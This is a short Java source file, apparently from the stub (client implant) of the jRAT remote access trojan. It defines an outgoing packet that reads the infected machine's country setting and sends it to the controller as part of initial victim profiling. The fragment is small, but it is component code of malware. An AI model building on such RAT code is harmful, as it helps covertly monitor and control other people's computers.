package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet8InitCountry extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(System.getProperty("user.country"));
	}

	@Override
	public short getPacketId() {
		return (byte) 8;
	}
}